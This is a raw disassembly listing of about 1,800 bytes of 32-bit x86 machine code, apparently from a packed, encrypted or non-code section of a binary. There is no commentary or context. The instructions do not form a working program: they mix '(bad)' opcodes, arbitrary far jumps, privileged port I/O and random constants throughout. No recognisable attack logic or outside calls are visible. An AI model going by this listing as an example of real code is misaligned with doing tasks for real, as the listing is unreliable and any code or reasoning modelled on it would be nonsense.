  41c618:	fstp   QWORD PTR [esi]
  41c61a:	jbe    0x41c681
  41c61c:	adc    DWORD PTR [edx+0x7d],edx
  41c61f:	push   esp
  41c620:	fwait
  41c621:	mov    ebx,0xf8b0e64
  41c626:	jnp    0x41c5bd
  41c628:	fidivr WORD PTR [ecx]
  41c62a:	sbb    DWORD PTR [edx+0x62],ecx
  41c62d:	cmp    al,BYTE PTR ds:0xf64e7f9d
  41c633:	mov    dl,0xf0
  41c635:	test   BYTE PTR [edx],bh
  41c637:	test   al,0xa
  41c639:	stos   BYTE PTR es:[edi],al
  41c63a:	mov    ebp,0x59c2e214
  41c63f:	ds std 
  41c641:	jb     0x41c695
  41c643:	sti    
  41c644:	mov    esi,0xad8dadd6
  41c649:	xor    al,0x82
  41c64b:	jge    0x41c639
  41c64d:	push   esp
  41c64e:	pop    edi
  41c64f:	mov    ah,0x34
  41c651:	bound  esi,QWORD PTR [edx+0x7c9062c9]
  41c657:	dec    edi
  41c658:	das    
  41c659:	or     ecx,0xa48ae2dd
  41c65f:	xchg   ecx,eax
  41c660:	test   eax,0x7c6a0787
  41c665:	sub    eax,0xadde1732
  41c66a:	popa   
  41c66b:	cmp    al,0x4
  41c66d:	mov    dl,0x8
  41c66f:	jecxz  0x41c661
  41c671:	cmp    al,0xf
  41c673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c674:	pop    edi
  41c675:	aam    0x93
  41c677:	dec    eax
  41c678:	loop   0x41c658
  41c67a:	inc    edx
  41c67b:	dec    esp
  41c67c:	clc    
  41c67d:	and    ebx,esp
  41c67f:	repnz xchg edi,eax
  41c681:	mov    bl,dh
  41c683:	jmp    0xd8c8:0x87d0cfd2
  41c68a:	nop
  41c68b:	xor    edx,DWORD PTR [edi+0x8]
  41c68e:	jae    0x41c613
  41c690:	jo     0x41c6cb
  41c692:	xor    al,0x24
  41c694:	push   es
  41c695:	popf   
  41c696:	cs mov cl,0xd6
  41c699:	push   ebx
  41c69a:	and    BYTE PTR [eax],0x41
  41c69d:	ret    0x1a31
  41c6a0:	aaa    
  41c6a1:	fdivr  DWORD PTR [ebp+0x70]
  41c6a4:	int3   
  41c6a5:	xchg   ebp,eax
  41c6a6:	ins    BYTE PTR es:[edi],dx
  41c6a7:	and    al,0xa3
  41c6a9:	sub    eax,0xd51fad9f
  41c6ae:	hlt    
  41c6af:	and    esi,ebx
  41c6b1:	cmp    DWORD PTR [edx],0x9d214885
  41c6b7:	les    edx,FWORD PTR [edi-0x62]
  41c6ba:	push   DWORD PTR [ecx+0x578bd9db]
  41c6c0:	push   edi
  41c6c1:	xor    eax,0xbfba25a
  41c6c6:	push   cs
  41c6c7:	xchg   esi,eax
  41c6c8:	add    al,0x44
  41c6ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6cb:	inc    eax
  41c6cc:	les    esi,FWORD PTR [edx-0x35]
  41c6cf:	punpckhwd mm1,mm7
  41c6d2:	nop
  41c6d3:	pop    edx
  41c6d4:	adc    DWORD PTR [ecx+0x755968a1],ecx
  41c6da:	add    ah,ah
  41c6dc:	mov    ecx,0x7b8d1b23
  41c6e1:	jmp    0x1147:0xb8d0817f
  41c6e8:	push   ds
  41c6e9:	scas   al,BYTE PTR es:[edi]
  41c6ea:	jle    0x41c694
  41c6ec:	xchg   esi,ebx
  41c6ee:	and    DWORD PTR [edx],ebp
  41c6f0:	push   es
  41c6f1:	cmp    BYTE PTR ds:0x4bb48fa6,bh
  41c6f7:	rol    BYTE PTR [ecx+0x1cc0b3cf],1
  41c6fd:	sbb    eax,0x17344d15
  41c702:	cld    
  41c703:	imul   esi,esi,0x41126545
  41c709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c70a:	inc    edi
  41c70b:	cld    
  41c70c:	arpl   WORD PTR [esp+eax*2],ax
  41c70f:	ins    BYTE PTR es:[edi],dx
  41c710:	and    al,0xe7
  41c712:	scas   eax,DWORD PTR es:[edi]
  41c713:	addr16 pop ecx
  41c715:	cs and eax,0x82f1b30
  41c71b:	add    ah,al
  41c71d:	mov    eax,ds:0x91157658
  41c722:	daa    
  41c723:	add    DWORD PTR [eax+0x7e2f67af],edx
  41c729:	inc    edx
  41c72a:	daa    
  41c72b:	push   ecx
  41c72c:	lods   al,BYTE PTR ds:[esi]
  41c72d:	xchg   esi,eax
  41c72e:	ja     0x41c6f8
  41c730:	ins    DWORD PTR es:[edi],dx
  41c731:	imul   eax,DWORD PTR [ebp+0x2bd7ed60],0xffffff81
  41c738:	lock fidivr DWORD PTR cs:[edx-0x16]
  41c73d:	out    0x71,al
  41c73f:	adc    ah,BYTE PTR [ecx+esi*4-0x7baaea10]
  41c746:	inc    eax
  41c747:	mov    eax,0x108d5dfc
  41c74c:	mov    ds:0xed4fc046,eax
  41c751:	dec    eax
  41c752:	imul   esi,ebp,0xfffffffe
  41c755:	hlt    
  41c756:	jns    0x41c78e
  41c758:	and    eax,0x49197544
  41c75d:	ins    DWORD PTR es:[edi],dx
  41c75e:	loopne 0x41c7a0
  41c760:	or     eax,0xb3b3c506
  41c765:	rol    esi,cl
  41c767:	mov    ebx,0xf62c5b0a
  41c76c:	aaa    
  41c76d:	lahf   
  41c76e:	js     0x41c772
  41c770:	out    dx,eax
  41c771:	dec    edx
  41c772:	mov    ch,0x15
  41c774:	lock inc esp
  41c776:	and    DWORD PTR [ebp-0x15],ecx
  41c779:	add    BYTE PTR [eax+eax*4-0x2c5ff7c8],al
  41c780:	add    bh,BYTE PTR [esi+0x51]
  41c783:	pop    esp
  41c784:	int3   
  41c785:	xor    al,al
  41c787:	out    0x62,al
  41c789:	push   cs
  41c78a:	hlt    
  41c78b:	jns    0x41c762
  41c78d:	iret   
  41c78e:	loop   0x41c72d
  41c790:	mov    WORD PTR [esi],es
  41c792:	lods   eax,DWORD PTR ds:[esi]
  41c793:	bound  ebp,QWORD PTR [ecx-0x42799c5e]
  41c799:	adc    BYTE PTR es:[edx-0x46fc9f09],bl
  41c7a0:	popf   
  41c7a1:	fdiv   QWORD PTR [esi+ebp*8+0x17]
  41c7a5:	arpl   bx,dx
  41c7a7:	int    0x45
  41c7a9:	add    DWORD PTR [eax+0x53],esp
  41c7ac:	imul   edx,DWORD PTR [ecx+0x6f8142a1],0xd1b0ca8e
  41c7b6:	nop
  41c7b7:	push   ecx
  41c7b8:	pop    ebp
  41c7b9:	or     ch,bl
  41c7bb:	mov    al,ds:0x9f418dc6
  41c7c0:	jo     0x41c83e
  41c7c2:	outs   dx,BYTE PTR ds:[esi]
  41c7c3:	push   eax
  41c7c4:	bound  eax,QWORD PTR [edx]
  41c7c6:	mov    ah,0xf9
  41c7c8:	cmp    BYTE PTR [ecx-0x3e],cl
  41c7cb:	mov    ah,0x84
  41c7cd:	cli    
  41c7ce:	daa    
  41c7cf:	sub    DWORD PTR [esi-0x4c5b2539],eax
  41c7d5:	push   0x4e67ff9b
  41c7da:	add    DWORD PTR [edi],eax
  41c7dc:	push   esi
  41c7dd:	cld    
  41c7de:	mov    DWORD PTR [esi-0x3c],ebp
  41c7e1:	arpl   ax,ax
  41c7e3:	inc    eax
  41c7e4:	clc    
  41c7e5:	bound  edx,QWORD PTR [ebx]
  41c7e7:	mov    edx,fs
  41c7e9:	dec    ecx
  41c7ea:	ins    DWORD PTR es:[edi],dx
  41c7eb:	nop
  41c7ec:	adc    al,0xa0
  41c7ee:	pop    ebp
  41c7ef:	mov    DWORD PTR [edx+0x4a7194b5],eax
  41c7f5:	fchs   
  41c7f7:	fstp   QWORD PTR [ecx]
  41c7f9:	popf   
  41c7fa:	jge    0x41c79e
  41c7fc:	xchg   bx,ax
  41c7fe:	pop    ds
  41c7ff:	cmp    edx,ebp
  41c801:	jl     0x41c842
  41c803:	jne    0x41c815
  41c805:	(bad)  
  41c806:	push   edx
  41c807:	repnz aad 0xb7
  41c80a:	call   0x61d0:0x8845b8ab
  41c811:	ins    DWORD PTR es:[edi],dx
  41c812:	fs pop esi
  41c814:	sti    
  41c815:	clc    
  41c816:	sbb    esi,edx
  41c818:	scas   al,BYTE PTR es:[edi]
  41c819:	mov    BYTE PTR [eax+0x75e8e80d],ch
  41c81f:	test   BYTE PTR [esp+edx*1-0x1e],dl
  41c823:	cmp    DWORD PTR [ecx-0x603f5498],ebp
  41c829:	jno    0x41c85b
  41c82b:	adc    al,0x8d
  41c82d:	cld    
  41c82e:	mov    bh,0x4d
  41c830:	pop    ebp
  41c831:	lds    edi,FWORD PTR [edx]
  41c833:	mov    ds:0x94d9ba51,eax
  41c838:	mov    WORD PTR [eax+0x5f],ss
  41c83b:	push   ebp
  41c83c:	mov    cl,BYTE PTR [ebp+0x39]
  41c83f:	jmp    0x696f:0xaa000f83
  41c846:	rcr    ecx,1
  41c848:	cli    
  41c849:	xchg   DWORD PTR [ebx],eax
  41c84b:	call   0x2b423d7c
  41c850:	and    BYTE PTR [eax+0x7d],cl
  41c853:	into   
  41c854:	or     ecx,edx
  41c856:	shr    BYTE PTR [ebp-0x3a],1
  41c859:	xchg   bl,dh
  41c85b:	je     0x41c833
  41c85d:	or     al,0x42
  41c85f:	jl     0x41c824
  41c861:	fild   QWORD PTR [edi]
  41c863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c864:	mov    ch,0x48
  41c866:	aas    
  41c867:	pop    edi
  41c868:	loopne 0x41c859
  41c86a:	cmp    dl,BYTE PTR [ecx+0x59]
  41c86d:	xchg   esp,eax
  41c86e:	adc    DWORD PTR [ebp+0x35ed1828],ebp
  41c874:	rcr    DWORD PTR [eax+0x7],1
  41c877:	out    dx,eax
  41c878:	push   esp
  41c879:	lds    ebx,FWORD PTR [edi-0x68]
  41c87c:	inc    edi
  41c87d:	cmc    
  41c87e:	mov    ebp,0x8cccd47c
  41c883:	loop   0x41c901
  41c885:	and    al,0x67
  41c887:	int3   
  41c888:	lahf   
  41c889:	push   ss
  41c88a:	fidivr DWORD PTR [ebx+0x4c]
  41c88d:	shl    DWORD PTR [edi+0x5f],1
  41c890:	not    ebx
  41c892:	dec    ebp
  41c893:	cdq    
  41c894:	xchg   esi,eax
  41c895:	jne    0x41c8ef
  41c897:	into   
  41c898:	rol    DWORD PTR [edx-0x18c6f4cb],0xcc
  41c89f:	cmp    edi,esi
  41c8a1:	(bad)  
  41c8a2:	ror    DWORD PTR ds:0x4647fc3d,cl
  41c8a8:	ret    0x572b
  41c8ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8ac:	xor    cl,BYTE PTR [esi+0x1d]
  41c8af:	popf   
  41c8b0:	arpl   WORD PTR [edx+0xfb67254],bx
  41c8b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8b7:	jne    0x41c87b
  41c8b9:	cmc    
  41c8ba:	mov    bh,BYTE PTR ds:[eax+0x2c]
  41c8be:	sar    DWORD PTR [ebp-0x2f05d066],1
  41c8c4:	outs   dx,BYTE PTR ds:[esi]
  41c8c5:	mov    cl,0x5a
  41c8c7:	sahf   
  41c8c8:	stc    
  41c8c9:	fsqrt  
  41c8cb:	xchg   esp,eax
  41c8cc:	xor    al,0x85
  41c8ce:	add    edx,edx
  41c8d0:	jae    0x41c8e6
  41c8d2:	mov    eax,0xcd3d49e6
  41c8d7:	xor    BYTE PTR [esi+esi*8],dl
  41c8da:	cli    
  41c8db:	mov    al,0xd0
  41c8dd:	add    edi,DWORD PTR [edx+0x71b24bcf]
  41c8e3:	mov    eax,ds:0xf19b0011
  41c8e8:	push   0xffffffcf
  41c8ea:	lea    eax,[ecx+0x4d]
  41c8ed:	inc    ebx
  41c8ee:	and    al,0x92
  41c8f0:	xchg   DWORD PTR [eax],ebx
  41c8f2:	xchg   edx,eax
  41c8f3:	push   edx
  41c8f4:	mov    cl,BYTE PTR [ebx+0x35]
  41c8f7:	xchg   ecx,eax
  41c8f8:	pop    ss
  41c8f9:	dec    edi
  41c8fa:	in     eax,dx
  41c8fb:	jl     0x41c892
  41c8fd:	cmp    ebp,DWORD PTR [ebx+0x62ffd76]
  41c903:	or     ebp,DWORD PTR [esi+0x3dffc31c]
  41c909:	rcr    BYTE PTR [edi+0x5],1
  41c90c:	hlt    
  41c90d:	mov    BYTE PTR [edx+edi*8],ah
  41c910:	addr16 xchg ecx,eax
  41c912:	aad    0x5d
  41c914:	lods   eax,DWORD PTR ds:[esi]
  41c915:	aad    0x29
  41c917:	cmp    ebx,eax
  41c919:	out    0xaf,eax
  41c91b:	cdq    
  41c91c:	xchg   edi,eax
  41c91d:	outs   dx,DWORD PTR ds:[esi]
  41c91e:	lahf   
  41c91f:	or     DWORD PTR [eax],edi
  41c921:	out    dx,eax
  41c922:	cmp    BYTE PTR [ecx+eax*1-0x13caf4da],ch
  41c929:	pop    ecx
  41c92a:	xchg   edi,eax
  41c92b:	adc    al,0x32
  41c92d:	sbb    eax,0x6643d0df
  41c932:	leave  
  41c933:	add    eax,DWORD PTR [ebp+0x73ab67b9]
  41c939:	xchg   edx,eax
  41c93a:	push   ebp
  41c93b:	inc    ebp
  41c93c:	cmc    
  41c93d:	pop    eax
  41c93e:	xor    DWORD PTR [edx+0x30],0x7f64d391
  41c945:	pushf  
  41c946:	add    dh,ah
  41c948:	dec    esi
  41c949:	jg     0x41c8d4
  41c94b:	pop    ebp
  41c94c:	mov    ch,BYTE PTR [edx-0x61d36960]
  41c952:	pop    ds
  41c953:	in     eax,0x7c
  41c955:	or     BYTE PTR [edi],0xc4
  41c958:	cmp    DWORD PTR [eax+0x13],0x9ab3657f
  41c95f:	inc    ecx
  41c960:	dec    eax
  41c961:	xchg   ecx,eax
  41c962:	fdiv   DWORD PTR [edi]
  41c964:	lods   eax,DWORD PTR ds:[esi]
  41c965:	mov    esp,DWORD PTR [esi+0x6a]
  41c968:	add    DWORD PTR [eax+ecx*1-0x1c],ebp
  41c96c:	jg     0x41c95a
  41c96e:	bound  edx,QWORD PTR [edx+ecx*1]
  41c971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c972:	pop    ebx
  41c973:	sub    bh,BYTE PTR [esi+0x33]
  41c976:	cmp    edx,DWORD PTR [ecx]
  41c978:	outs   dx,BYTE PTR ds:[esi]
  41c979:	add    eax,0x62eef773
  41c97e:	push   ebx
  41c97f:	test   DWORD PTR [esi+edx*8],eax
  41c982:	(bad)  [esi+0x2b7c69c1]
  41c988:	test   eax,0xbe85ea12
  41c98d:	xor    esi,DWORD PTR [esi-0x6b89d23f]
  41c993:	sub    edx,edi
  41c995:	mov    esp,0xf7b852ce
  41c99a:	xchg   DWORD PTR [ebp+0x21],ebp
  41c99d:	cmp    al,ch
  41c99f:	lods   eax,DWORD PTR ds:[esi]
  41c9a0:	dec    ebp
  41c9a1:	lock mov eax,0x313b35a5
  41c9a7:	arpl   ax,sp
  41c9a9:	push   esi
  41c9aa:	lea    ebp,[eax+ecx*1-0x20ce0c78]
  41c9b1:	or     esi,0xffffffe8
  41c9b4:	mov    eax,0x9b5af467
  41c9b9:	pop    esp
  41c9ba:	push   ebp
  41c9bb:	and    al,bh
  41c9bd:	mov    esi,0x29080302
  41c9c2:	fld    QWORD PTR [ebx-0x5e]
  41c9c5:	or     esp,DWORD PTR [eax-0x1501ec2c]
  41c9cb:	sbb    dh,dl
  41c9cd:	mov    cl,0x56
  41c9cf:	cwde   
  41c9d0:	jmp    0xc7aef1
  41c9d5:	sub    DWORD PTR [esi+0x66fc1d6c],ecx
  41c9db:	sbb    esi,ecx
  41c9dd:	repnz fs mov bl,0x3f
  41c9e1:	call   0x73c0a52f
  41c9e6:	xchg   ebx,eax
  41c9e7:	fistp  QWORD PTR [ecx-0x5a]
  41c9ea:	aaa    
  41c9eb:	jb     0x41c9a5
  41c9ed:	(bad)  
  41c9ee:	dec    eax
  41c9ef:	in     eax,0x16
  41c9f1:	lds    edi,FWORD PTR [eax+eax*1-0x4]
  41c9f5:	sub    eax,0xe468c088
  41c9fa:	cmp    BYTE PTR [ebx-0x58abcc7c],ah
  41ca00:	sbb    esp,DWORD PTR [edx-0x41e76070]
  41ca06:	sub    ecx,DWORD PTR [esi-0x2469496]
  41ca0c:	xchg   eax,ebx
  41ca0e:	mov    esi,0x3b3b0af5
  41ca13:	inc    esi
  41ca14:	cmp    ecx,DWORD PTR [esi+0x18]
  41ca17:	test   eax,0x61dd2909
  41ca1c:	pop    esi
  41ca1d:	or     esp,DWORD PTR [eax]
  41ca1f:	jl     0x41c9da
  41ca21:	js     0x41ca2b
  41ca23:	idiv   BYTE PTR [ebp-0x57490f51]
  41ca29:	out    0x8,eax
  41ca2b:	call   edx
  41ca2d:	fwait
  41ca2e:	bound  eax,QWORD PTR [edi+ebx*4]
  41ca31:	ret    0x469d
  41ca34:	loop   0x41c9fd
  41ca36:	bound  esp,QWORD PTR [edi-0x6a82e7d7]
  41ca3c:	mov    ah,0xf1
  41ca3e:	ds hlt 
  41ca40:	call   0xa4f49053
  41ca45:	sar    BYTE PTR [edi-0x4],1
  41ca48:	adc    bh,BYTE PTR [esi-0xe]
  41ca4b:	fdivrp st(0),st
  41ca4d:	int    0x1d
  41ca4f:	xchg   ecx,eax
  41ca50:	sbb    ch,ah
  41ca52:	cmp    BYTE PTR [esi-0x6e15a597],bh
  41ca58:	push   ss
  41ca59:	mov    ah,0x26
  41ca5b:	(bad)  
  41ca5c:	lahf   
  41ca5d:	adc    BYTE PTR [ebx-0x5],ch
  41ca60:	xlat   BYTE PTR ds:[ebx]
  41ca61:	adc    eax,0x30162bae
  41ca66:	pop    ds
  41ca67:	mov    ss,esi
  41ca69:	retf   
  41ca6a:	lahf   
  41ca6b:	bound  eax,QWORD PTR ds:0xd7568099
  41ca71:	ffree  st(2)
  41ca73:	xchg   ebx,eax
  41ca74:	fpatan 
  41ca76:	mov    ecx,0x513640c7
  41ca7b:	hlt    
  41ca7c:	loope  0x41ca7f
  41ca7e:	pop    eax
  41ca7f:	out    0xd5,eax
  41ca81:	or     al,BYTE PTR [edi-0x49]
  41ca84:	stos   BYTE PTR es:[edi],al
  41ca85:	sub    ebp,esi
  41ca87:	inc    ebx
  41ca88:	push   esi
  41ca89:	xor    DWORD PTR [esi-0x4e],ebx
  41ca8c:	fiadd  WORD PTR [ebx+0x65c2064e]
  41ca92:	and    ebp,eax
  41ca94:	ror    DWORD PTR [ecx+0x6f],1
  41ca97:	xlat   BYTE PTR ds:[ebx]
  41ca98:	pop    eax
  41ca99:	gs sub eax,0x6a1f8849
  41ca9f:	mov    esi,0x3a62ef1
  41caa4:	xchg   edx,eax
  41caa5:	push   0x9499aa29
  41caaa:	les    eax,FWORD PTR [edi+0x6b7c2533]
  41cab0:	mov    al,0x1d
  41cab2:	fist   WORD PTR ds:0x7fa71f14
  41cab8:	xchg   DWORD PTR ss:[edi-0x7c84e65a],ebp
  41cabf:	dec    edx
  41cac0:	xchg   ebp,eax
  41cac1:	mov    esi,DWORD PTR [ebp+0x2cef4b98]
  41cac7:	leave  
  41cac8:	in     al,0x9f
  41caca:	and    BYTE PTR [ebp-0x31],dl
  41cacd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cace:	jbe    0x41cab6
  41cad0:	ss fdivr st(3),st
  41cad3:	in     al,0xc7
  41cad5:	xchg   dl,dh
  41cad7:	mov    BYTE PTR [esi+0x71c0110e],bl
  41cadd:	jb     0x41ca6f
  41cadf:	add    cl,cl
  41cae1:	pop    esp
  41cae2:	or     ah,cl
  41cae4:	jge    0x41cab4
  41cae6:	(bad)  
  41cae7:	xchg   edx,eax
  41cae8:	mov    cl,0xf7
  41caea:	pop    ss
  41caeb:	sub    al,0xe6
  41caed:	mov    gs,WORD PTR [ebp-0x5b]
  41caf0:	adc    dl,bh
  41caf2:	sbb    ebx,DWORD PTR [edi+0x2f]
  41caf5:	add    edi,esi
  41caf7:	shl    DWORD PTR [esi],1
  41caf9:	fcmovne st,st(1)
  41cafb:	dec    edi
  41cafc:	add    eax,0x7240303d
  41cb01:	es hlt 
  41cb03:	mov    edi,0xc34026fe
  41cb08:	mov    bh,0xcf
  41cb0a:	jecxz  0x41cb6b
  41cb0c:	sbb    eax,DWORD PTR [eax-0x79]
  41cb0f:	addr16 fs lahf 
  41cb12:	push   ecx
  41cb13:	add    ch,bh
  41cb15:	mov    eax,0x25c272a4
  41cb1a:	xchg   edx,eax
  41cb1b:	ret    
  41cb1c:	inc    eax
  41cb1d:	mov    ecx,0x67752f7c
  41cb22:	lea    esp,[ebx+0x36c7a502]
  41cb28:	pop    eax
  41cb29:	test   eax,0xd336b1b4
  41cb2e:	fwait
  41cb2f:	xchg   ecx,eax
  41cb30:	ins    BYTE PTR es:[edi],dx
  41cb31:	out    0x6e,al
  41cb33:	mov    ebp,0xa57d3c1b
  41cb38:	(bad)  
  41cb3a:	inc    edi
  41cb3b:	out    dx,eax
  41cb3c:	push   ecx
  41cb3d:	test   DWORD PTR [eax-0x59],ebp
  41cb40:	xlat   BYTE PTR ds:[ebx]
  41cb41:	jle    0x41cacf
  41cb43:	ins    BYTE PTR es:[edi],dx
  41cb44:	shld   DWORD PTR [esi-0xb],esi,cl
  41cb48:	and    ebx,DWORD PTR [esi-0x45]
  41cb4b:	(bad)  
  41cb4c:	bound  ecx,QWORD PTR [ecx]
  41cb4e:	in     al,0x3a
  41cb50:	daa    
  41cb51:	ror    dh,0xc4
  41cb54:	and    ah,bl
  41cb56:	adc    al,0x9
  41cb58:	and    esp,ebx
  41cb5a:	ficom  WORD PTR [eax+0x57]
  41cb5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb5e:	jno    0x41cb30
  41cb60:	icebp  
  41cb61:	push   es
  41cb62:	xor    eax,DWORD PTR [ebx]
  41cb64:	add    al,0x6b
  41cb66:	sub    bl,BYTE PTR [ebx-0x70]
  41cb69:	pop    ds
  41cb6a:	sahf   
  41cb6b:	mov    esi,0xd53affc8
  41cb70:	or     DWORD PTR ds:0x449030aa,edx
  41cb76:	jl     0x41cb2b
  41cb78:	enter  0xd266,0xe2
  41cb7c:	and    ah,BYTE PTR [edi]
  41cb7e:	jg     0x41cb16
  41cb80:	jle    0x41cb11
  41cb82:	sbb    BYTE PTR [edx-0x62],ah
  41cb85:	jp     0x41cb84
  41cb87:	es push ebp
  41cb89:	push   ss
  41cb8a:	sahf   
  41cb8b:	mov    eax,ds:0x6a2a0d41
  41cb90:	cli    
  41cb91:	mov    edx,0x7fd88f1f
  41cb96:	or     eax,0x4e6ff3d8
  41cb9b:	jmp    0x41cbbe
  41cb9d:	dec    ebp
  41cb9e:	mov    ah,0x33
  41cba0:	xchg   edx,eax
  41cba1:	push   cs
  41cba2:	xchg   BYTE PTR [edx],ah
  41cba4:	jne    0x41cb67
  41cba6:	dec    esp
  41cba7:	retf   0xd097
  41cbaa:	jl     0x41cc0a
  41cbac:	arpl   WORD PTR [edx-0x5eaeb413],bp
  41cbb2:	xchg   esi,eax
  41cbb3:	lock jmp 0x41cbd4
  41cbb6:	mov    esi,0x6681beaa
  41cbbb:	phaddw mm4,QWORD PTR ds:0xec435603
  41cbc3:	repz jb 0x41cc0d
  41cbc6:	(bad)  
  41cbc7:	test   eax,0x13d6e24f
  41cbcc:	retf   
  41cbcd:	mov    bh,0xb8
  41cbcf:	stc    
  41cbd0:	mov    edi,0xb04ed596
  41cbd5:	xchg   esi,eax
  41cbd6:	pop    es
  41cbd7:	lahf   
  41cbd8:	retf   
  41cbd9:	cli    
  41cbda:	pop    esi
  41cbdb:	(bad)  
  41cbdc:	test   dx,sp
  41cbdf:	mov    ebp,0xd40e5026
  41cbe4:	outs   dx,BYTE PTR ds:[esi]
  41cbe5:	dec    ebx
  41cbe6:	es imul eax,edi,0xffffffcb
  41cbea:	jp     0x41cbad
  41cbec:	js     0x41cb7d
  41cbee:	cmp    eax,0x44070c13
  41cbf3:	jl     0x41cb94
  41cbf5:	dec    edi
  41cbf6:	and    al,0x7a
  41cbf8:	cmp    ebx,ecx
  41cbfa:	mov    eax,0xf69ebbff
  41cbff:	and    DWORD PTR [esi-0x4931b569],0x77
  41cc06:	aas    
  41cc07:	out    0x64,eax
  41cc09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc0a:	loope  0x41cc2b
  41cc0c:	das    
  41cc0d:	call   0xa83c:0x2ad314d6
  41cc14:	out    dx,al
  41cc15:	mov    DWORD PTR [esi+eiz*2+0x7],0xa128c8c0
  41cc1d:	xlat   BYTE PTR ds:[ebx]
  41cc1e:	mov    eax,ds:0xba59e9c9
  41cc23:	popf   
  41cc24:	mov    edi,0x158082be
  41cc29:	fisttp QWORD PTR [eax]
  41cc2b:	jle    0x41cc80
  41cc2d:	push   ecx
  41cc2e:	lds    ebp,FWORD PTR [edi+0x54984632]
  41cc34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc35:	std    
  41cc36:	daa    
  41cc37:	arpl   WORD PTR [ebx+0x47],sp
  41cc3a:	imul   esi
  41cc3c:	dec    ebp
  41cc3d:	and    eax,0x3caeb6b
  41cc42:	mov    BYTE PTR [edx+0x43],dl
  41cc45:	jp     0x41cc13
  41cc47:	mov    eax,ds:0x6b7943eb
  41cc4c:	fdivp  st(4),st
  41cc4e:	sbb    edi,edx
  41cc50:	inc    edx
  41cc51:	sti    
  41cc52:	or     al,0x29
  41cc54:	mov    esp,0x5da346d4
  41cc59:	shl    DWORD PTR [edx+edx*8+0x49],cl
  41cc5d:	adc    al,0xdf
  41cc5f:	cmc    
  41cc60:	push   esp
  41cc61:	fs jl  0x41ccb6
  41cc64:	and    eax,0x7a361669
  41cc69:	scas   eax,DWORD PTR es:[edi]
  41cc6a:	dec    edx
  41cc6b:	jae    0x41ccd3
  41cc6d:	inc    edi
  41cc6e:	sub    eax,0xefa44670
  41cc73:	mov    BYTE PTR ds:0xff709a4,dh
  41cc79:	std    
  41cc7a:	and    al,0x2b
  41cc7c:	in     eax,0xd5
  41cc7e:	mov    esp,0xfb93899d
  41cc83:	pop    eax
  41cc84:	add    eax,0xb84c9ca0
  41cc89:	cmp    eax,0xe6e1054a
  41cc8e:	out    dx,al
  41cc8f:	into   
  41cc90:	pop    es
  41cc91:	sbb    DWORD PTR [eax+0x1bdc001a],0x0
  41cc98:	cwde   
  41cc99:	rcl    BYTE PTR [ecx+0x21],0x8c
  41cc9d:	add    eax,edx
  41cc9f:	mov    esi,0x4a56dc05
  41cca4:	(bad)  
  41cca5:	mov    esi,0xce521562
  41ccaa:	jp     0x41cd14
  41ccac:	mov    ch,BYTE PTR [edx-0x110534f3]
  41ccb2:	fwait
  41ccb3:	jo     0x41cd16
  41ccb5:	pusha  
  41ccb6:	je     0x41cc39
  41ccb8:	shl    BYTE PTR [edi+0x51],cl
  41ccbb:	push   ecx
  41ccbc:	aad    0x76
  41ccbe:	xchg   ebx,eax
  41ccbf:	sbb    DWORD PTR [ebx],0x14c953b
  41ccc5:	sub    al,0x33
  41ccc7:	icebp  
  41ccc8:	cld    
  41ccc9:	fst    QWORD PTR [edx-0xc]
  41cccc:	fistp  QWORD PTR [edi]
  41ccce:	mov    ah,0x8
  41ccd0:	es popf 
  41ccd2:	ret    
  41ccd3:	cmp    eax,0x3b87f5af
  41ccd8:	and    ch,bl
  41ccda:	retf   0x2708
  41ccdd:	jg     0x41cca8
  41ccdf:	jecxz  0x41cd06
  41cce1:	adc    al,BYTE PTR [edx-0x6716ab05]
  41cce7:	jns    0x41cd06
  41cce9:	repnz ins DWORD PTR es:[edi],dx
  41cceb:	pushf  
  41ccec:	push   cs
  41cced:	add    bl,dh
  41ccef:	add    ch,BYTE PTR [ebx]
  41ccf1:	stos   BYTE PTR es:[edi],al
  41ccf2:	push   cs
  41ccf3:	xchg   BYTE PTR [ecx+edi*2-0x6e],dl
  41ccf7:	mov    edi,0x84a49dbd
  41ccfc:	dec    eax
  41ccfd:	xchg   esi,eax
  41ccfe:	shl    DWORD PTR [edx+eax*2],0x67
  41cd02:	inc    esi
  41cd03:	std    
  41cd04:	sub    BYTE PTR [edx-0xb1aae0f],bh
  41cd0a:	dec    edi
  41cd0b:	dec    edx
  41cd0c:	pop    eax
  41cd0d:	mov    ebx,0x8fc0bb1b
  41cd12:	in     eax,dx
  41cd13:	pop    esp
  41cd14:	ror    DWORD PTR [esi-0x1],0xc2
  41cd18:	add    BYTE PTR [ebp+0x4c6662f3],cl
  41cd1e:	iret   
  41cd1f:	sar    BYTE PTR [ebp*2+0x78d06b24],1
  41cd26:	xor    eax,0xe619fdd2
  41cd2b:	fs mov ecx,0x75527d1c
  41cd31:	xlat   BYTE PTR ds:[ebx]
  41cd32:	in     al,dx
  41cd33:	and    ch,bl
  41cd35:	push   0xfa940a2
  41cd3a:	loop   0x41cd2d
  41cd3c:	push   ebx
  41cd3d:	in     al,0x4d
  41cd3f:	push   cs
  41cd40:	xor    ecx,DWORD PTR [edi]
  41cd42:	loopne 0x41cd73
  41cd44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd45:	lds    eax,FWORD PTR [edx+ebx*4+0x76]
  41cd49:	jmp    esp
  41cd4b:	xlat   BYTE PTR ds:[ebx]
  41cd4c:	mov    dh,0xd8
  41cd4e:	mov    ds:0x2ed2e825,al
  41cd53:	mov    DWORD PTR [ecx+0x32a1bc7c],ebp
  41cd59:	add    ah,BYTE PTR [edi+edx*4]
  41cd5c:	cmp    bl,0xa8
  41cd5f:	pop    esp
  41cd60:	xor    ebp,0x55
  41cd63:	(bad)  
  41cd64:	and    bl,dl
  41cd66:	sub    eax,0x512fdaf0
  41cd6b:	mov    cl,0x94
  41cd6d:	mov    cl,0x9f
  41cd6f:	aad    0xa2
  41cd71:	push   ebp
  41cd72:	es sub eax,0xbacbcd54
